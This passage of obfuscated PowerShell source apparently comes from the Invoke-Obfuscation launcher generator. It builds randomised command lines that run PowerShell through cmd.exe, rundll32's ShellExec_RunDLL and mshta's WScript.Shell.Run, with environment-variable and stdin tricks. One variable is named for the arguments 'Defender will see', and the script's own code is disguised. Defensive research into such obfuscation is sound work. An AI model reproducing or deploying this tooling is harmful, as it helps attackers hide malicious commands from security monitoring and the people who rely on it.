              ${v`ARiABL`eN`AmE}  = ([Char[]]${VAR`IaBLEn`A`mE}.("{1}{2}{0}"-f'wer','ToL','o').Invoke()  | &("{1}{2}{0}" -f'ch-Object','F','orEa') {${C`hAR} = ${_}; If(&("{3}{0}{2}{1}"-f 't-','andom','R','Ge') -Input (0..1)){${c`har} = ${CH`Ar}.("{2}{0}{1}" -f 'oStri','ng','T').Invoke().("{1}{0}{2}" -f 'Upp','To','er').Invoke()} ${Ch`Ar}}) -Join ''
              
              
              ${INv`Oke`OPT`iOn} = (&("{9}{1}{5}{6}{2}{3}{8}{10}{0}{7}{4}" -f 'eS','-Ra','ron','ment','ntax','n','domInvokeRandomEnvi','y','Varia','Out','bl') ${vArIabLEN`A`mE}).("{1}{2}{0}" -f 'e','Rep','lac').Invoke('\"',"'").("{2}{0}{1}"-f 'ep','lace','R').Invoke('`','')

              
              ${sheLL3`2`DLL} = ([Char[]]("{1}{3}{0}{2}" -f'DL','SH','L','ELL32.') | &("{4}{3}{2}{1}{0}" -f'Object','ch-','Ea','or','F') {${CH`AR} = ${_}; If(&("{0}{1}{2}"-f'G','et-Ran','dom') -Input (0..1)){${Ch`AR} = ${c`HaR}.("{1}{0}{2}" -f 'o','T','String').Invoke().("{1}{0}" -f'pper','ToU').Invoke()} ${cH`AR}}) -Join ''

              
              ${ex`eCUTiON`Flags`Run`Dlls`yntAx} = (${p`oWeRSHELl`F`LA`GSARR`AY} | &("{0}{1}{2}" -f 'Wher','e','-Object') {${_}.("{0}{1}"-f'Tr','im').Invoke()."le`Ng`Th" -gt 0} | &("{2}{1}{3}{0}" -f'Object','ach','ForE','-') {'"' + ' '*(&("{1}{2}{0}" -f'om','Get-Ran','d') -Minimum 0 -Maximum 3) + ${_} + ' '*(&("{2}{1}{0}"-f 'om','d','Get-Ran') -Minimum 0 -Maximum 3) + '"' + ' '*(&("{0}{2}{1}" -f'Get-Rand','m','o') -Minimum 1 -Maximum 4)}) -Join ''
 
              
              ${pScmDSyn`T`Ax}     = ' '*(&("{1}{2}{0}" -f'ndom','G','et-Ra') -Minimum 1 -Maximum 4) + ${EXecuTIONf`LAGsr`UNDl`LSY`Nt`AX} + ' '*(&("{1}{0}{2}{3}"-f 'et','G','-R','andom') -Minimum 1 -Maximum 4) + "`"$InvokeOption`""
              ${R`U`N`DLLCM`dSynTax} = ' '*(&("{0}{3}{1}{2}" -f 'G','-Ra','ndom','et') -Minimum 1 -Maximum 4) + ${SHEL`l3`2`DLL} + (&("{1}{2}{0}" -f'om','Ge','t-Rand') -Input @(',',' ', ((&("{2}{1}{0}"-f 'm','do','Get-Ran') -Input @(',',',',',',' ',' ',' ') -Count (&("{1}{0}{2}"-f'R','Get-','andom') -Input @(4..6)))-Join''))) + ("{4}{1}{0}{5}{3}{2}" -f'E','ell','DLL','un','Sh','xec_R') + ' '*(&("{2}{3}{1}{0}" -f 'andom','R','Get','-') -Minimum 1 -Maximum 4) + "`"$PathToPowerShell`"" + ${pSCMd`sYn`TAX}
              ${Cm`D`s`YNTAx}       = ${s`l`AsHC} + ' '*(&("{0}{3}{2}{1}"-f 'Ge','andom','-R','t') -Minimum 0 -Maximum 4) + '"' + ${Sets`Y`NtaX} + ${s`C`Ript`St`RINg} + '&&' + ${pAtHtOr`U`NDll} + ${r`U`Nd`LLcmDSy`NtAX}
    
              
              ${a`RgsDe`FEnDe`Rwi`ll`sEE} += , @(${pAT`hT`ocMd}             , ${cM`Dsy`NTAX})
              ${a`RgSD`eFE`N`DeRWiLLSEe} += , @(${paT`h`TOru`NDll}          , ${R`UNDl`Lc`md`s`YntAX})
              ${arGsdEfENd`Er`WI`L`lsEE} += , @("`"$PathToPowerShell`"", ${PScMd`synt`Ax}.("{1}{0}" -f 'lace','Rep').Invoke('^',''))

              ${CMDLiN`E`oUtp`Ut} = ${Patht`oc`MD} + ${C`m`Ds`yntAX}
        }
        12 {
              
              
              

              
              ForEach(${Ch`AR} in ${c`Ha`RSTOEsC`ApE})
              {
                  If(${S`criP`TSTR`inG}.("{2}{1}{0}"-f's','in','Conta').Invoke("^^^$Char")) {${scRIPt`s`TrinG} = ${SCriP`TsTR`inG}.("{2}{0}{1}" -f 'p','lace','Re').Invoke("^^^$Char","^$Char")}
              }
              If(${scri`pts`TRiNG}.("{1}{2}{0}"-f 'ntains','C','o').Invoke(("{1}{0}" -f '^','^^^')))
              {
                  ${Script`STri`Ng} = ${ScRipT`Str`iNg}.("{0}{1}"-f 'Re','place').Invoke(("{0}{1}" -f'^^^','^'),'^^')
              }

              
              If(${sc`RipTst`R`iNG}.("{2}{0}{1}"-f'ai','ns','Cont').Invoke('\"')) {${SC`R`Ipts`Tr`iNG} = ${s`CrIP`TsTr`inG}.("{1}{0}" -f 'lace','Rep').Invoke('\"','"')}
              
              
              
              ${cHaR`sF`ORvArnaMe} = @('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z')
              ${V`AR`iablEName}  = (&("{1}{2}{0}" -f'ndom','Get','-Ra') -Input ${cH`ArSFOrVar`N`AME} -Count (${Ch`ArS`FOrv`ArNA`me}."COu`NT"/(&("{0}{2}{1}"-f'Get-Ra','m','ndo') -Input @(5..10)))) -Join ''
              ${VAriA`Ble`NAmE}  = ([Char[]]${Va`R`IAB`lEnAmE}.("{0}{1}" -f'ToL','ower').Invoke() | &("{0}{1}{2}{3}"-f'ForEa','ch','-','Object') {${CH`Ar} = ${_}; If(&("{0}{3}{1}{2}"-f'G','nd','om','et-Ra') -Input (0..1)){${c`Har} = ${Ch`AR}.("{1}{0}{2}" -f'i','ToStr','ng').Invoke().("{0}{1}"-f 'ToUppe','r').Invoke()} ${c`har}}) -Join ''
              
              
              ${seT`SYN`TaX}  = ([Char[]]'set' | &("{2}{1}{3}{0}" -f't','h-O','ForEac','bjec') {${Ch`AR} = ${_}; If(&("{1}{0}{2}{3}"-f'-','Get','Ran','dom') -Input (0..1)){${C`HAR} = ${C`hAr}.("{2}{0}{1}"-f'oStrin','g','T').Invoke().("{0}{1}"-f'To','Upper').Invoke()} ${C`hAr}}) -Join ''
              ${s`ETSyn`TAX}  = ${SE`Ts`ynTaX} + ' '*(&("{2}{0}{1}" -f'n','dom','Get-Ra') -Minimum 2 -Maximum 4) + ${va`RI`Abl`E`NaME} + '='
              
              
              ${sets`yN`TAx}     = ([Char[]]${s`EtS`YNTAX}.("{0}{1}"-f 'ToLowe','r').Invoke()     | &("{2}{3}{4}{0}{1}" -f'h-Obj','ect','ForE','a','c') {${cH`AR} = ${_}; If(&("{2}{1}{0}"-f 'om','d','Get-Ran') -Input (0..1)){${Ch`AR} = ${C`hAr}.("{0}{1}{2}" -f 'ToSt','r','ing').Invoke().("{1}{2}{0}" -f 'per','ToU','p').Invoke()} ${C`hAR}}) -Join ''
              ${V`ARiAbL`ENA`mE}  = ([Char[]]${V`ARiAb`lEN`A`Me}.("{0}{1}"-f 'ToLow','er').Invoke()  | &("{0}{1}{2}{3}"-f 'Fo','rEach-','Ob','ject') {${C`HAr} = ${_}; If(&("{1}{0}{2}" -f 'R','Get-','andom') -Input (0..1)){${C`HaR} = ${cH`Ar}.("{1}{2}{0}" -f'ing','To','Str').Invoke().("{1}{0}" -f'r','ToUppe').Invoke()} ${cH`AR}}) -Join ''
              
              
              
              ${inv`oK`Eo`PTiON} = (&("{2}{5}{8}{0}{1}{4}{7}{3}{6}{9}" -f'nv','ironment','O','le','Vari','u','Syn','ab','t-RandomInvokeRandomE','tax') ${VAr`i`AB`lEName}).("{1}{0}"-f 'ace','Repl').Invoke('\"',"'").("{1}{0}"-f 'place','Re').Invoke('`','')
              While(${I`NVoK`EOpTiOn}."LeNg`Th" -gt 200)
              {
                  ${INV`OK`EO`PTioN} = (&("{4}{5}{0}{8}{7}{3}{2}{1}{6}"-f 'mInvokeRan','bleS','a','tVari','Out-Rand','o','yntax','vironmen','domEn') ${v`ARi`AbLeN`AmE}).("{0}{1}"-f 'Repl','ace').Invoke('\"',"'").("{0}{1}" -f 'Re','place').Invoke('`','')
              }

              
              ${c`ReaTeoBj`eCt} = ([Char[]]("{3}{0}{4}{1}{5}{2}"-f 'cript','r','bject','VBS',':C','eateO') | &("{4}{2}{1}{3}{0}" -f'ject','c','orEa','h-Ob','F') {${C`HaR} = ${_}; If(&("{1}{0}{2}"-f 'et-Rando','G','m') -Input (0..1)){${cH`AR} = ${Ch`AR}.("{1}{0}{2}" -f'ri','ToSt','ng').Invoke().("{1}{0}{2}"-f 'oU','T','pper').Invoke()} ${C`har}}) -Join ''
              ${W`S`C`RIpTsH`eLL} = ([Char[]]("{1}{3}{2}{0}"-f'll','WScript','he','.S')         | &("{1}{0}{2}" -f 'j','ForEach-Ob','ect') {${CH`AR} = ${_}; If(&("{3}{1}{2}{0}"-f 'andom','e','t-R','G') -Input (0..1)){${cH`AR} = ${c`Har}.("{0}{2}{1}" -f'To','ring','St').Invoke().("{1}{0}" -f 'Upper','To').Invoke()} ${C`Har}}) -Join ''
              ${R`Un}          = ([Char[]]("{0}{1}" -f'.R','un')                  | &("{4}{2}{1}{0}{3}"-f 'ec','Obj','-','t','ForEach') {${CH`Ar} = ${_}; If(&("{2}{0}{1}"-f't-Rando','m','Ge') -Input (0..1)){${C`HaR} = ${c`hAr}.("{1}{0}" -f'ring','ToSt').Invoke().("{1}{0}"-f 'r','ToUppe').Invoke()} ${C`hAR}}) -Join ''
              ${T`RuE`S`TrinG}   = ([Char[]]("{1}{0}"-f'rue','T')                  | &("{3}{4}{0}{1}{2}"-f 'a','ch-Objec','t','For','E') {${cH`Ar} = ${_}; If(&("{1}{0}{2}{3}"-f'Ran','Get-','d','om') -Input (0..1)){${cH`AR} = ${cH`Ar}.("{0}{1}{2}"-f'To','Stri','ng').Invoke().("{0}{1}"-f'To','Upper').Invoke()} ${cH`AR}}) -Join ''
              ${wiNd`owC`LO`Se}  = ([Char[]]("{0}{1}{2}" -f'Wi','ndow.Clos','e')          | &("{1}{0}{3}{4}{2}"-f'a','ForE','ect','ch-Ob','j') {${CH`AR} = ${_}; If(&("{2}{3}{1}{0}" -f'ndom','Ra','G','et-') -Input (0..1)){${Ch`AR} = ${c`haR}.("{0}{1}{2}"-f'To','Strin','g').Invoke().("{2}{1}{0}" -f'r','e','ToUpp').Invoke()} ${ch`AR}}) -Join ''
            
              
              If((&("{3}{2}{1}{0}"-f'Random','t-','e','G') -Input @(0..1)) -eq 0)
              {
                  ${wSc`RiPts`HEll} = &("{3}{4}{0}{1}{2}"-f'te','nate','dString','Ou','t-Conca') ${w`SCRI`PTs`heLl} '"'
              }
              Else
              {
                  ${ws`c`RiP`T`ShEll} = '"' + ${WsCrI`p`Ts`HEll} + '"'
              }

              
              If((&("{1}{2}{0}" -f'm','Get-Ran','do') -Input @(0..1)) -eq 0)
              {
                  
                  ${SUBStrin`G`ArRAy} += (&("{2}{3}{4}{5}{0}{1}"-f'St','ring','Out-Con','cate','n','ated') ${In`V`O`KEoPT`ION}.("{1}{0}" -f'm','Tri').Invoke('"') '"').("{0}{1}"-f'Rep','lace').Invoke('`"','"')

                  
                  If(${iNV`O`KeoPtION}.("{2}{1}{0}"-f 'ains','t','Con').Invoke(((("{0}{1}{2}"-f'^u6r','+u','6r'))-rEPlAce([CHaR]117+[CHaR]54+[CHaR]114),[CHaR]34)))
                  {
                      ${iNvoK`E`o`p`TIon} = ${IN`V`oKeo`PtIoN}.("{0}{2}{1}"-f'Re','ace','pl').Invoke(((("{1}{0}{2}"-f '{','^','0}+{0}'))-F [Char]34),'^')
                  }
              }

              
              If((&("{0}{2}{1}" -f 'G','m','et-Rando') -Input @(0..1)) -eq 0)
              {
                  ${O`NE} = 1
              }
              Else
              {
                  
                  ${r`AnDOMNuM`BEr} = &("{2}{1}{3}{0}"-f 'm','an','Get-R','do') -Minimum 3 -Maximum 25
                  If(&("{0}{2}{1}" -f'Ge','dom','t-Ran') -Input @(0..1))
                  {
                      ${O`NE} = [String]${RANdOmN`Um`BEr} + '-' + (${RaN`DO`MnUMbEr}-1)
                  }
                  Else
                  {
                      ${sE`C`ONdranD`om`NuMb`eR} = &("{1}{0}{2}" -f 't-Ra','Ge','ndom') -Minimum 1 -Maximum ${rA`NdOmNumB`ER}
                      ${o`NE} = [String]${RA`N`d`OMNUmBer} + '-' + ${seCoNDRaN`D`oMn`UMB`er} + '-' + (${r`AN`dOMnU`Mb`ER}-${sEc`ONdr`ANdoMnuMB`er}-1)
                  }

                  
                  If((&("{0}{2}{1}"-f 'Get','Random','-') -Input @(0..1)) -eq 0)
                  {
                      ${o`Ne} = '(' + ${O`Ne} + ')'
                  }
              }

              
              ${pScMdS`y`N`TAx}    = ${Po`WErS`helLF`LA`gS} + ' '*(&("{2}{1}{0}" -f'om','t-Rand','Ge') -Minimum 0 -Maximum 3) + ${IN`Vo`k`EoP`TIon} + '",' + ${O`Ne} + ',' + ${tR`UesTRI`NG} + ")($WindowClose)"
              ${MS`H`TACm`dSyntax} = ' '*(&("{2}{0}{1}"-f 't-R','andom','Ge') -Minimum 1 -Maximum 4) + ${c`R`EAt`EobjECt} + "($WScriptShell)" + ${r`Un} + '("' + ${P`AT`hTo`po`WeRShe`Ll} + ${P`S`cM`DsYNTax} + '"'
              ${C`MDSYNT`AX}      = ${Sl`AS`HC} + ' '*(&("{2}{0}{1}"-f'and','om','Get-R') -Minimum 0 -Maximum 4) + '"' + ${seT`s`YntAx} + ${Sc`Ri`PtSTri`Ng} + '&&' + ${pAt`h`T`OMshTA} + ${M`Sht`Acm`dSYnTaX}
    
              
              ${aRGSD`efENDEr`Wi`Ll`s`ee} += , @(${P`A`ThtocMD}       , ${C`m`DsYN`Tax})
              ${ArGS`DeFe`Nde`R`wIL`lSee} += , @(${PAtHt`OM`s`HTA}     , ${ms`Hta`c`MDSynT`AX})
              ${aRgS`dEf`eND`e`RW`IlLSEE} += , @(${PAT`htOPOWe`RSh`elL}, ${P`SCmD`s`YNTAX}.("{0}{1}{2}" -f'Rep','lac','e').Invoke('^',''))

              ${CmDlInE`ouTp`UT} = ${p`Ath`TOCmD} + ${cMD`s`ynT`Ax}
          }
        ("{1}{0}"-f'ault','def') {&("{2}{3}{1}{0}" -f'ror','-Er','Wr','ite') ('A'+'n '+'inva'+'lid'+' '+"`$LaunchType "+'valu'+'e '+"($LaunchType) "+'w'+'as '+'pa'+'ss'+'ed '+'to'+' '+'sw'+'itch '+'blo'+'c'+'k '+'for'+' '+'O'+'ut-Po'+'w'+'e'+'r'+'ShellLaunch'+'er.'); Exit;}
    }

    
    If(${A`RgSDEFEN`d`E`R`wIllS`Ee}."CO`UNT" -gt 0)
    {
        &("{2}{0}{1}"-f 'i','te-Host','Wr') ("`n`nProcess "+'Argum'+'e'+'nt '+'Tree'+' '+'of'+' '+'Ob'+'fusca'+'tedC'+'omman'+'d '+'wi'+'th '+'cu'+'rrent'+' '+'launc'+'he'+'r:')
    
        ${co`UN`TeR} = -1
        ForEach(${l`Ine} in ${ARgs`dEfEN`dErWI`L`l`seE})
        {
            If(${l`inE}."cou`Nt" -gt 1)
            {
                ${PA`RT1} = ${l`Ine}[0]
                ${P`A`Rt2} = ${Li`NE}[1]
            }
            Else
            {
                ${P`A`RT1} = ${lI`NE}
                ${P`ARt2} = ''
            }

            ${LI`NES`pacinG} = ''
            If(${CO`UNT`eR} -ge 0)
            {
                ${lIN`Es`pa`CINg} = ("{1}{0}" -f '   ','  ')*${cOu`NtER}
                &("{2}{0}{1}"-f 'o','st','Write-H') ("$LineSpacing|`n$LineSpacing\--> "+'') -NoNewline
            }

            
            &("{2}{1}{0}" -f 'ite-Host','r','W') ${Par`T1} -NoNewLine -ForegroundColor ("{2}{0}{1}" -f 'll','ow','Ye')

            
            ${C`MDM`AXl`EnGTh} = 8190

            If(${PA`Rt2}."le`NGth" -gt ${cmdM`Axl`EnG`Th})
            {
                
                ${rE`D`ActEDPRIntl`e`Ngth} = ${CM`d`m`A`xLENgtH}/5
        
                
                ${CmD`L`I`NewIdTh} = (&("{0}{1}{2}" -f'Ge','t-H','ost'))."UI"."ra`wui"."B`U`Ffe`RsIzE"."Wi`DTh"
                ${rEDac`T`IONME`SSAGE} = ("<REDACTED: ArgumentLength = $($Part1.Length + $Part2.Length)> ")
                ${C`e`Nt`EREdReDacT`ioNMeSs`AG`EsTa`RT`I`NDEX} = ((${CMDLIN`e`w`Id`TH}-${R`EDaCt`Io`N`messagE}."L`e`NgtH")/2) - (${P`Ar`T1}."le`Ng`Th"+${lin`e`Spac`ING}."LENg`Th")
                ${CuRr`ENt`R`edAc`TiONMe`sS`AGe`STarTinDeX} = (${re`daCTEdp`RiNtl`E`NG`TH} % ${C`MDLInEw`IDth})
        
                If(${CU`Rr`e`NTRe`d`Acti`onME`sSAgEsTArTinDeX} -gt ${Ce`NT`erEDrEd`Ac`T`I`On`meSSagESTAR`TI`NdEx})
                {
                    ${r`ED`Ac`T`EdpRiNtLENG`Th} = ${rEd`AC`T`e`DPrI`NTLenGtH}-(${cu`RReN`TrEdAcTi`O`NM`ESSag`eSTAR`Tin`d`eX}-${CE`NtER`e`DRedacTi`onM`E`sSAgeSt`AR`T`iNd`ex})
                }
                Else
                {
                    ${rEd`A`CTeDpr`iNTL`EN`gtH} = ${r`EDaCteDPr`intLE`N`g`Th}+(${Cen`TeredR`eda`cTIoN`mesSAG`E`S`TART`index}-${CuR`RenT`RED`AC`TioN`meSs`AgEStArtIND`EX})
                }
    
                &("{1}{0}{2}" -f 'os','Write-H','t') ${p`Art2}.("{1}{0}{2}"-f'bSt','Su','ring').Invoke(0,${REdACt`ed`P`R`Int`L`eNgth}) -NoNewLine -ForegroundColor ("{0}{1}" -f'Cy','an')
                &("{2}{1}{0}"-f 'Host','e-','Writ') ${ReDA`C`Ti`ONmeSsa`gE} -NoNewLine -ForegroundColor ("{0}{1}" -f'Magent','a')
                &("{0}{1}{2}"-f 'Wr','i','te-Host') ${PaR`T2}.("{2}{0}{1}" -f 'ri','ng','SubSt').Invoke(${pA`R`T2}."Leng`Th"-${Re`DacTedp`RINtLE`NG`TH}) -ForegroundColor ("{0}{1}" -f'C','yan')
            }
            Else
            {
                &("{0}{1}{2}" -f'Writ','e-','Host') ${pAR`T2} -ForegroundColor ("{1}{0}"-f'yan','C')
            }

            ${Cou`NtEr}++
        }
        &("{2}{0}{1}"-f'tart-Sl','eep','S') 1
    }

    
    
    ${cmDmAx`l`eNgTh} = 8190
    If((${cm`DlI`NEoUt`pUt}."l`enGTH" -gt ${cmDM`AxlE`NgTH}) -AND (${L`AUNcH`Ty`pe} -lt 13))
    {
        &("{3}{2}{1}{0}"-f 'ost','te-H','i','Wr') ""
        &("{3}{0}{4}{1}{2}"-f'rit','r','ning','W','e-Wa') "This command exceeds the cmd.exe maximum allowed length of $CmdMaxLength characters! Its length is $($CmdLineOutput.Length) characters. "
        &("{0}{2}{1}" -f 'Start-Sl','ep','e') 1
    }

    Return ${Cm`DlINeOut`PuT}
}


Function OU`T-`RanDOmi`N`VOKerAndoMeNvIrONmENt`V`ARiAb`LEsY`NTAx
{


    [CmdletBinding()] Param (
        [Parameter(poSiTioN = 0)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${E`NVvAr`NamE}
    )

    
    ${e`NVv`A`RNAME} = &("{1}{2}{0}" -f'm','Get-Ra','ndo') -Input ${EN`V`VarN`AME}

    
    ${eX`eCconTEXT`Va`RI`AB`lES}  = @()
    ${exE`cc`o`NteXTV`ArI`Ab`Les} += '(' + (&("{3}{2}{1}{0}"-f 'dom','an','R','Get-') -Input @('DIR',("{1}{2}{0}" -f 'Item','Get-Chil','d'),'GCI',("{2}{0}{1}" -f'hildIte','m','C'),'LS',("{2}{0}{1}"-f '-It','em','Get'),'GI',("{1}{0}"-f'em','It'))) + ' ' + ((("{2}{1}{3}{0}" -f'e:','v','fet','ariabl'))."Re`PlAce"('fet',[sTRIng][chaR]39)) + (&("{1}{2}{0}"-f'ndom','G','et-Ra') -Input @(("{1}{0}"-f 'xt','ex*'),("{1}{2}{0}"-f'onContext','Exec','uti'))) + (((("{1}{0}"-f '0}).Value','{')) -f [ChaR]39))
    ${eX`Ec`c`ontextVARIa`B`Les} += '(' + (&("{2}{0}{1}"-f 'Rand','om','Get-') -Input @(("{2}{3}{1}{0}" -f'ble','aria','Get-','V'),'GV',("{0}{1}{2}" -f 'Varia','bl','e'))) + ' ' + "'" + (&("{2}{1}{0}" -f 'ndom','et-Ra','G') -Input @(("{1}{0}" -f'x*xt','e'),("{0}{1}{2}"-f'Execution','Cont','ext'))) + "'" + (&("{2}{1}{0}" -f 'Random','et-','G') -Input (((("{0}{2}{1}"-f ')','Value','.'))),(' ' + (("{0}{2}{1}" -f '-','y','ValueOnl').("{0}{1}{2}" -f'Su','bStri','ng').Invoke(0,(&("{1}{0}{2}" -f 'n','Get-Ra','dom') -Minimum 3 -Maximum (("{0}{1}{2}"-f'-Va','lueO','nly')."LE`NG`TH"+1)))) + ')')))

    
    ${exECcO`NTEXt`VA`RIAB`Le} = &("{0}{1}{2}"-f'Get','-Rand','om') -Input ${eX`E`cc`oN`TEX`TvARIableS}

    
    ${ge`TRan`dOM`V`A`RIaBLeSYNTaX}  = @()
    ${GETRANDoM`VarI`ABleSY`Nt`Ax} += '(' + (&("{2}{0}{1}" -f 'and','om','Get-R') -Input @('DIR',("{1}{2}{3}{0}" -f'ldItem','G','et-C','hi'),'GCI',("{2}{1}{0}{3}" -f'e','ildIt','Ch','m'),'LS',("{1}{0}{2}"-f't','Ge','-Item'),'GI',("{0}{1}" -f 'Ite','m'))) + ' ' + ("{0}{1}" -f'en','v:') + ${eN`VVar`NamE} + ((("{0}{1}{2}" -f').','Valu','e')))
    ${GetRA`ND`OMVAR`IABL`esY`Ntax} += ('(' + ((("{2}{0}{3}{6}{1}{5}{4}" -f 'tE','a','[Environment]::Ge','nvironm','ble(','ria','entV'))) + "'$EnvVarName'" + ',' + ((("{2}{0}{3}{1}"-f'Processq','V','qrV','r'))-rePLACe ([Char]113+[Char]114+[Char]86),[Char]39) + ')' + ')')
    
    
    ${g`etRa`NDOm`V`AR`iaBleSY`Nt`Ax} = &("{2}{3}{0}{1}" -f'-Rando','m','G','et') -Input ${GEtraNdOMVA`RIabLES`Yn`T`AX}

    
    
    ${eXPR`ESSIO`N`TOINvoKe} = ${gEtRAnDOM`V`A`RI`Abl`ESYnTax}
    If(&("{1}{2}{0}" -f'-Random','Ge','t') -Input @(0..1))
    {
        
        ${i`NVOK`EOPTIon} = &("{2}{3}{1}{0}{4}{6}{5}"-f'late','su','O','ut-Encap','dInvokeExpress','on','i') ${expr`eSsIo`N`TO`iNV`o`ke}
    }
    Else
    {
        ${invO`K`EOp`TIOn} = (&("{0}{1}{2}"-f 'Ge','t','-Random') -Input @((('6p'+'YExec'+'ution'+'Context')."R`e`pLAcE"(([chaR]54+[chaR]112+[chaR]89),[STRInG][chaR]36)),'${ExecutionContext}',${ExEc`cONtExtvaria`B`LE})) + ((("{5}{2}{8}{1}{3}{6}{4}{7}{0}" -f '(','an','ok','d.Invo','i','.Inv','keScr','pt','eComm'))) + ' '*(&("{0}{2}{1}"-f'Get-Rand','m','o') -Minimum 0 -Maximum 3) + ${eX`Pre`SsIO`NTo`i`NvO`ke} + ' '*(&("{2}{0}{1}"-f'Ran','dom','Get-') -Minimum 0 -Maximum 3) + ')'
    }

    
    ${in`VO`KeO`PTIon} = ([Char[]]${INV`O`Ke`oPT`IOn}.("{0}{1}"-f'ToLo','wer').Invoke() | &("{1}{0}{2}{3}"-f'Each-','For','Ob','ject') {${ch`AR} = ${_}; If(&("{0}{2}{1}" -f'Get-','om','Rand') -Input (0..1)){${cH`Ar} = ${C`har}.("{2}{1}{0}"-f'g','oStrin','T').Invoke().("{2}{0}{1}"-f'oU','pper','T').Invoke()} ${Ch`AR}}) -Join ''

    
    If(${iNVokEop`Ti`oN} -ne '-')
    {
        
        ${i`NvOk`EopTi`oN} = &("{0}{5}{6}{1}{4}{2}{3}"-f'Out-O','atedTo','mm','and','kenCo','bfu','sc') -ScriptBlock ( (  VARIaBLe ('JT0'+'g')).ValuE::("{1}{0}"-f 'reate','C').Invoke(${INV`Ok`eOPT`ion}))
        ${InVokEo`pTI`on} = &("{5}{4}{2}{0}{1}{3}" -f'okenCo','mman','T','d','ated','Out-Obfusc') -ScriptBlock (  ${Jt0G}::("{0}{1}" -f 'Cr','eate').Invoke(${in`VO`keop`TiOn})) ("{1}{0}{3}{2}"-f 'a','R','e','ndomWhitespac') 1
    }
    
    
    ForEach(${c`HAR} in @('<','>','|','&'))
    {
        
        If(${InvOk`e`OpT`IoN}.("{1}{0}{2}"-f'ntain','Co','s').Invoke("$Char")) 
        {
            ${invo`ke`Op`TI`ON} = ${INv`oKeOP`TI`on}.("{0}{2}{1}" -f 'Re','e','plac').Invoke("$Char","^$Char")
        }
    }
    
    
    If(${iNv`OKEo`ptI`oN}.("{0}{1}{2}" -f 'C','o','ntains').Invoke('"'))
    {
        ${iNV`OKEop`TiON} = ${iNV`Ok`E`oPT`ioN}.("{1}{2}{0}"-f 'e','Re','plac').Invoke('"','\"')
    }
    
    Return ${INV`o`keoPTioN}
}


Function oUt-raND`OM`p`OW`E`RShELlstdI`N`InVokEsyNTAx
{

    
    
    
    
    
    
    ${execCo`N`Te`XT`VAR`iab`LES}  = @()
    ${eXEc`C`OnTeXTv`AriAbles} += '(' + (&("{0}{1}{2}"-f'G','et-Ra','ndom') -Input @('DIR',("{0}{1}{2}" -f 'Get-Ch','ild','Item'),'GCI',("{0}{1}{2}" -f 'Chi','l','dItem'),'LS',("{0}{1}{2}" -f'Get','-','Item'),'GI',("{1}{0}"-f'm','Ite'))) + ' ' + ((("{3}{1}{2}{0}"-f 'ariable:','H','Tv','R')) -RePLace 'RHT',[CHaR]39) + (&("{1}{2}{0}" -f'm','Get-Ra','ndo') -Input @(("{1}{0}" -f'*xt','ex'),("{4}{2}{0}{3}{1}" -f 'ecutionCon','t','x','tex','E'))) + ((("{0}{1}"-f '5BK).Va','lue'))."rep`lace"(([chAR]53+[chAR]66+[chAR]75),[StrINg][chAR]39))
    ${EXEC`cOn`TE`XTVArIABLES} += '(' + (&("{0}{1}{2}" -f 'Ge','t-Rando','m') -Input @(("{1}{0}{3}{2}" -f 't-','Ge','e','Variabl'),'GV',("{2}{1}{0}"-f 'able','ri','Va'))) + ' ' + "'" + (&("{2}{0}{1}" -f 'et-R','andom','G') -Input @(("{0}{1}" -f 'e','x*xt'),("{0}{4}{2}{1}{3}"-f 'Exec','ontex','ionC','t','ut'))) + "'" + (&("{0}{2}{1}"-f 'Get-R','m','ando') -Input (((("{1}{2}{0}" -f 'Value',')','.'))),(' ' + (("{1}{0}{2}{3}"-f'Val','-','ueOnl','y').("{0}{1}"-f 'SubSt','ring').Invoke(0,(&("{1}{2}{0}{3}" -f '-Rand','Ge','t','om') -Minimum 3 -Maximum (("{2}{0}{1}"-f 'ValueO','nly','-')."l`enG`Th"+1)))) + ')')))
    
    ${EX`EC`CoNtEx`TvA`Ri`A`BLe} = (&("{0}{1}{3}{2}" -f'G','e','om','t-Rand') -Input ${eXEc`Co`NT`eXTvaRia`BL`Es})

    ${Ran`doM`INPUtvARIA`BLE} = (&("{0}{1}{2}"-f'Get','-Rando','m') -Input @((('L'+'gvInput')."REPL`AcE"(([ChAR]76+[ChAR]103+[ChAR]118),[stRiNg][ChAR]36)),'${Input}'))

    
    
    ${e`XPRE`s`S`IOntoi`NvokE} = ${RandOM`I`N`p`UTV`AriABLE}
    If(&("{2}{3}{0}{1}" -f'd','om','Ge','t-Ran') -Input @(0..1))
    {
        
        ${i`NV`okeop`TION} = &("{0}{2}{4}{3}{1}{5}" -f 'Out-E','es','ncaps','tedInvokeExpr','ula','sion') ${eXPRe`SSIonT`OInvo`KE}
    }
    Else
    {
        ${IN`VOKeop`T`iON} = (&("{1}{3}{0}{2}"-f 'ando','Get-','m','R') -Input @((('Fha'+'Exec'+'ut'+'ionCont'+'ext')."REP`LacE"(([ChaR]70+[ChaR]104+[ChaR]97),'$')),'${ExecutionContext}',${exe`CC`onTEXTV`A`Riab`LE})) + ((("{6}{3}{1}{7}{4}{5}{0}{2}"-f'ke','keCo','Script(','vo','d.Inv','o','.In','mman'))) + ' '*(&("{1}{0}{2}" -f 't-','Ge','Random') -Minimum 0 -Maximum 3) + ${eXP`REss`I`oN`TOinVOKe} + ' '*(&("{1}{2}{0}"-f 'Random','Ge','t-') -Minimum 0 -Maximum 3) + ')'
    }

    
    ${InVOKE`oPtI`On} = ([Char[]]${iNV`o`KEoP`Tion}.("{2}{1}{0}"-f 'r','we','ToLo').Invoke() | &("{1}{0}{4}{3}{2}"-f'Each-','For','ct','e','Obj') {${Ch`Ar} = ${_}; If(&("{2}{1}{0}" -f'om','-Rand','Get') -Input (0..1)){${cH`AR} = ${c`haR}.("{2}{1}{0}"-f 'ing','r','ToSt').Invoke().("{1}{0}" -f 'per','ToUp').Invoke()} ${Ch`Ar}}) -Join ''

    
    If(${nOE`XIT})
    {
        ${Invo`K`EO`PtIOn} = '-'
    }

    
    ${Po`wErSh`e`LLstd`IN} = ${iNVo`keoPTi`On}

    
    ${pO`wErsh`E`lLsTD`IN} = ([Char[]]${pO`WErs`HE`lLst`din}.("{0}{2}{1}"-f'T','r','oLowe').Invoke() | &("{1}{2}{3}{0}"-f 'ct','Fo','rEach-','Obje') {${cH`Ar} = ${_}; If(&("{0}{1}{2}"-f 'Get-R','a','ndom') -Input (0..1)){${C`har} = ${C`HaR}.("{0}{2}{1}"-f'To','g','Strin').Invoke().("{1}{0}" -f'r','ToUppe').Invoke()} ${c`HAR}}) -Join ''

    
